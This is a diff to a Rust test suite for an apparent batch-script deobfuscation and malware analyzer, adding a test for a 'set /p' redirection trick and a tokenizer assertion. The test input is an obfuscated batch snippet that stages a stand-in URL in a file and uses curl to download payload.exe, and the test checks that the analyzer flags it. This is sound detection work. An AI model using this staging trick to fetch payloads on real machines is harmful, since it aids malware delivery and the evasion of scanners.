@@ -569,6 +569,29 @@ curl -o payload.exe %U%"#,
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn set_p_reads_first_line_from_fd0_prefix_redirected_file() {
+        let report = analyze(
+            br#"echo https://set-p-fd0-prefix-read.example/payload.exe>url.txt
+0^< url.txt set /p U=
+curl -o payload.exe %U%"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://set-p-fd0-prefix-read.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "set /p did not read fd0 prefix-redirected staged content: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
@@ -18761,6 +18784,7 @@ mod tokenizer_misc_tests {
             Some("C:/Temp/original.js")
         );
         assert_eq!(command_name("set/p X=").as_deref(), Some("set"));
+        assert_eq!(command_name("0<url.txt set /p U=").as_deref(), Some("set"));
     }
 }
 
